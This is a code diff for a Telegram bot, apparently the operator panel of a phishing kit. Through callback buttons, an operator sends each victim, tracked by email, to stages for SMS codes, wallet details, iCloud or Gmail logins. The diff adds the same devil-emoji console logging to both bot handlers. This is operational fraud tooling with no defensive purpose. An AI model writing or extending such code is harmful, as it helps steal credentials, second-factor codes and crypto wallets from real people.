@@ -316,16 +316,26 @@ bot.on("callback_query", async (query) => {
           const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
           
           let choiceText = '';
+          let consoleLog = '';
           if (action === "verifying_sms") {
             choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+            consoleLog = `😈 ${verifyEmail} directed to: SMS - 2`;
           } else if (action === "verifying_done") {
             choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+            consoleLog = `😈 ${verifyEmail} directed to: Done`;
           } else if (action === "verifying_wallet") {
             choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+            consoleLog = `😈 ${verifyEmail} directed to: Wallet`;
           } else if (action === "verifying_icloud") {
             choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+            consoleLog = `😈 ${verifyEmail} directed to: iCloud`;
           } else if (action === "verifying_gmail") {
             choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+            consoleLog = `😈 ${verifyEmail} directed to: Gmail`;
+          }
+          
+          if (consoleLog) {
+            console.log(consoleLog);
           }
           
           if (choiceText) {
@@ -894,16 +904,26 @@ if (bot2) {
             const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
             
             let choiceText = '';
+            let consoleLog = '';
             if (action === "verifying_sms") {
               choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+              consoleLog = `😈 ${verifyEmail} directed to: SMS - 2`;
             } else if (action === "verifying_done") {
               choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+              consoleLog = `😈 ${verifyEmail} directed to: Done`;
             } else if (action === "verifying_wallet") {
               choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+              consoleLog = `😈 ${verifyEmail} directed to: Wallet`;
             } else if (action === "verifying_icloud") {
               choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+              consoleLog = `😈 ${verifyEmail} directed to: iCloud`;
             } else if (action === "verifying_gmail") {
               choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+              consoleLog = `😈 ${verifyEmail} directed to: Gmail`;
+            }
+            
+            if (consoleLog) {
+              console.log(consoleLog);
             }
             
             if (choiceText) {
